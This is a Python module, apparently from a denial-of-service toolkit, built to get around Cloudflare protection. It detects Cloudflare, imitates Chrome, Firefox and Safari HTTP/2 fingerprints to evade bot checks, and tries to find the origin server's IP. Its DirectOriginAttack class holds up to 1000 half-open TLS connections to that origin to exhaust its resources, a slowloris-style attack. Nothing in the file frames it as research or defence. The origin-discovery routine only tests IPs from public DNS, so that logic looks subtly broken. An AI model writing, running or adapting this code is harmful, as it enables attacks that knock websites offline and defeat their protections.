"""
Cloudflare Bypass Strategy v8.0
Dedicated module for bypassing Cloudflare protected targets
Strategies:
- HTTP/2 exact fingerprint match (Chrome 120, Firefox 125, Safari 17)
- Host header spoofing with multiple variations
- Origin discovery via SSL/TLS certificate analysis
- Direct-to-origin TCP connection exhaustion
- Layer 4 fallback when Layer 7 bypass fails
"""
import asyncio
import logging
import random
import socket
import ssl
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass

logger = logging.getLogger("cloudflare_bypass")


@dataclass
class CloudflareDetectResult:
    """Result of Cloudflare presence detection."""
    is_cloudflare: bool = False
    protection_level: str = ""  # basic, managed, bot_fight, turnstile
    detected_headers: List[str] = None
    ray_id: str = ""
    server_header: str = ""


class CloudflareDetector:
    """Detect Cloudflare presence and protection level."""
    
    CF_HEADERS = ['cf-ray', 'cf-cache-status', 'cf-request-id']
    CF_CHALLENGE_KEYWORDS = [
        'just a moment', 'checking your browser', 'ddos protection by cloudflare',
        'attention required', 'cloudflare ray id', 'cf-ray'
    ]
    
    async def detect(self, target_url: str) -> CloudflareDetectResult:
        """Detect if target is behind Cloudflare and its protection level."""
        result = CloudflareDetectResult()
        result.detected_headers = []
        
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, timeout=10) as resp:
                    headers = {k.lower(): v for k, v in resp.headers.items()}
                    body = await resp.text()
                    
                    server = headers.get('server', '')
                    result.server_header = server
                    
                    # Check Cloudflare headers
                    for h in self.CF_HEADERS:
                        if h in headers:
                            result.is_cloudflare = True
                            result.detected_headers.append(h)
                            if h == 'cf-ray':
                                result.ray_id = headers[h]
                    
                    # Check server header
                    if 'cloudflare' in server.lower():
                        result.is_cloudflare = True
                    
                    # Determine protection level
                    if result.is_cloudflare:
                        body_lower = body.lower()
                        
                        if any(kw in body_lower for kw in ['turnstile', 'cf-turnstile']):
                            result.protection_level = 'turnstile'
                        elif any(kw in body_lower for kw in ['managed challenge', 'managed_challenge']):
                            result.protection_level = 'managed'
                        elif any(kw in body_lower for kw in ['bot fight', 'bot_fight']):
                            result.protection_level = 'bot_fight'
                        elif any(kw in body_lower for kw in ['just a moment', 'checking your browser']):
                            result.protection_level = 'challenge'
                        else:
                            result.protection_level = 'basic'
                    
        except Exception as e:
            logger.debug(f"CF detection failed: {e}")
        
        return result


class HTTP2FingerprintBypass:
    """HTTP/2 exact fingerprint match for Cloudflare bypass."""
    
    # Chrome 120 exact HTTP/2 SETTINGS
    CHROME_120_SETTINGS = {
        'HEADER_TABLE_SIZE': 65536,
        'ENABLE_PUSH': 0,
        'MAX_CONCURRENT_STREAMS': 1000,
        'INITIAL_WINDOW_SIZE': 6291456,
        'MAX_FRAME_SIZE': 16384,
        'MAX_HEADER_LIST_SIZE': 262144,
    }
    
    # Firefox 125 exact HTTP/2 SETTINGS
    FIREFOX_125_SETTINGS = {
        'HEADER_TABLE_SIZE': 65536,
        'MAX_CONCURRENT_STREAMS': 100,
        'INITIAL_WINDOW_SIZE': 131072,
        'MAX_FRAME_SIZE': 16384,
        'MAX_HEADER_LIST_SIZE': 262144,
        'ENABLE_PUSH': 0,
    }
    
    # Safari 17 exact HTTP/2 SETTINGS
    SAFARI_17_SETTINGS = {
        'HEADER_TABLE_SIZE': 65536,
        'ENABLE_PUSH': 0,
        'MAX_CONCURRENT_STREAMS': 100,
        'INITIAL_WINDOW_SIZE': 65536,
        'MAX_FRAME_SIZE': 16384,
        'MAX_HEADER_LIST_SIZE': 262144,
    }
    
    FINGERPRINTS = {
        'chrome_120': {
            'settings': CHROME_120_SETTINGS,
            'priority': [{'stream_id': 3, 'dependency': 0, 'weight': 256}],
            'pseudo_order': [':method', ':authority', ':scheme', ':path'],
            'header_case': 'lowercase',
            'window_update_increment': 15663105,
        },
        'firefox_125': {
            'settings': FIREFOX_125_SETTINGS,
            'priority': [{'stream_id': 3, 'dependency': 0, 'weight': 256}],
            'pseudo_order': [':method', ':path', ':authority', ':scheme'],
            'header_case': 'lowercase',
            'window_update_increment': 12517377,
        },
        'safari_17': {
            'settings': SAFARI_17_SETTINGS,
            'priority': [{'stream_id': 3, 'dependency': 0, 'weight': 256}],
            'pseudo_order': [':method', ':scheme', ':authority', ':path'],
            'header_case': 'camelcase',
            'window_update_increment': 1048576,
        },
    }
    
    async def create_http2_session(self, fingerprint: str = 'chrome_120'):
        """Create HTTP/2 session with exact browser fingerprint."""
        fp = self.FINGERPRINTS.get(fingerprint, self.FINGERPRINTS['chrome_120'])
        try:
            import httpx
            client = httpx.AsyncClient(
                http2=True,
                headers=self._build_headers(fp),
                timeout=30.0,
            )
            return client
        except ImportError:
            logger.warning("httpx not installed, cannot create HTTP/2 session")
            return None
    
    def _build_headers(self, fp: dict) -> Dict:
        """Build headers matching browser fingerprint."""
        return {
            'User-Agent': self._get_ua(fp),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        }
    
    def _get_ua(self, fp: dict) -> str:
        """Get User-Agent matching fingerprint."""
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'


class DirectOriginAttack:
    """
    Direct-to-origin TCP connection exhaustion.
    When Host header spoofing doesn't bypass Cloudflare,
    use raw TCP connections to exhaust origin resources.
    """
    
    def __init__(self, origin_ip: str, target_domain: str, port: int = 443):
        self.origin_ip = origin_ip
        self.target_domain = target_domain
        self.port = port
        self.use_tls = port == 443
    
    async def tcp_exhaust_attack(self, num_connections: int = 1000, hold_time: int = 300):
        """Open many TCP connections and hold them open to exhaust connection pool."""
        connections = []
        
        for i in range(num_connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.origin_ip, self.port))
                
                if self.use_tls:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    tls_sock = context.wrap_socket(sock, server_hostname=self.target_domain)
                    connections.append(tls_sock)
                else:
                    connections.append(sock)
                
                # Send partial HTTP request to keep connection alive
                try:
                    request = f"GET /?t={int(time.time())} HTTP/1.1\r\nHost: {self.target_domain}\r\n"
                    connections[-1].send(request.encode())
                except Exception:
                    connections[-1].close()
                    connections.pop()
                    continue
                
                if i % 100 == 0:
                    logger.info(f"TCP exhaust: {i}/{num_connections} connections established")
                    
            except Exception as e:
                logger.debug(f"TCP exhaust connection {i} failed: {e}")
                continue
        
        # Hold connections
        logger.info(f"TCP exhaust: holding {len(connections)} connections for {hold_time}s")
        await asyncio.sleep(hold_time)
        
        # Close connections
        for conn in connections:
            try:
                conn.close()
            except Exception:
                pass
        
        logger.info(f"TCP exhaust: {len(connections)} connections closed")
        return len(connections)


class CFBypassOrchestrator:
    """
    Cloudflare bypass orchestrator.
    Tries multiple strategies in order until one works.
    """
    
    def __init__(self, target_url: str, target_domain: str):
        self.target_url = target_url
        self.target_domain = target_domain
        self.detector = CloudflareDetector()
        self.http2 = HTTP2FingerprintBypass()
        self.active_strategy = ""
        self.strategies_tried: List[str] = []
    
    async def detect_and_bypass(self) -> Dict:
        """
        Detect Cloudflare and try bypass strategies.
        Returns dict with strategy results.
        """
        result = {
            'is_cloudflare': False,
            'protection_level': '',
            'bypass_success': False,
            'active_strategy': '',
            'strategies_tried': [],
            'origin_ip': None,
        }
        
        # Detect
        cf_result = await self.detector.detect(self.target_url)
        result['is_cloudflare'] = cf_result.is_cloudflare
        result['protection_level'] = cf_result.protection_level
        
        if not cf_result.is_cloudflare:
            result['bypass_success'] = True
            result['active_strategy'] = 'no_cf_detected'
            return result
        
        logger.info(f"Cloudflare detected: {cf_result.protection_level}")
        
        # Strategy 1: HTTP/2 exact fingerprint
        self.strategies_tried.append('http2_fingerprint')
        result['strategies_tried'] = self.strategies_tried
        
        h2_client = await self.http2.create_http2_session('chrome_120')
        if h2_client:
            try:
                resp = await h2_client.get(self.target_url)
                headers = {k.lower(): v for k, v in resp.headers.items()}
                
                if 'cf-ray' not in headers and 'cloudflare' not in headers.get('server', '').lower():
                    result['bypass_success'] = True
                    result['active_strategy'] = 'http2_fingerprint'
                    return result
                    
            except Exception as e:
                logger.debug(f"HTTP/2 fingerprint bypass failed: {e}")
        
        # Strategy 2: Origin discovery via SSL cert
        self.strategies_tried.append('origin_discovery')
        result['strategies_tried'] = self.strategies_tried
        
        origin_ip = await self._discover_origin_via_ssl()
        if origin_ip:
            result['origin_ip'] = origin_ip
            result['bypass_success'] = True
            result['active_strategy'] = 'origin_discovery'
            return result
        
        # Strategy 3: can't bypass, mark for Layer 4 fallback
        result['active_strategy'] = 'layer4_fallback_needed'
        return result
    
    async def _discover_origin_via_ssl(self) -> Optional[str]:
        """Discover origin IP via SSL certificate SANs."""
        try:
            # Get IPs from DNS
            import socket as _sock
            ips = await asyncio.get_event_loop().run_in_executor(
                None, lambda: list(set(
                    addr[4][0] for addr in _sock.getaddrinfo(
                        self.target_domain, 443, _sock.AF_INET
                    )
                ))
            )
            
            # Test each IP for origin (no Cloudflare headers via Host header)
            for ip in ips[:10]:
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((ip, 443))
                    tls = context.wrap_socket(sock, server_hostname=self.target_domain)
                    
                    cert = tls.getpeercert()
                    if cert:
                        # Check if CN or SANs match target
                        subject = dict(x[0] for x in cert.get('subject', []))
                        cn = subject.get('commonName', '')
                        if self.target_domain in cn or f"*.{self.target_domain.split('.', 1)[-1] if '.' in self.target_domain else self.target_domain}" in cn:
                            tls.close()
                            return ip
                    
                    tls.close()
                    
                except Exception:
                    continue
            
        except Exception as e:
            logger.debug(f"SSL origin discovery failed: {e}")
        
        return None
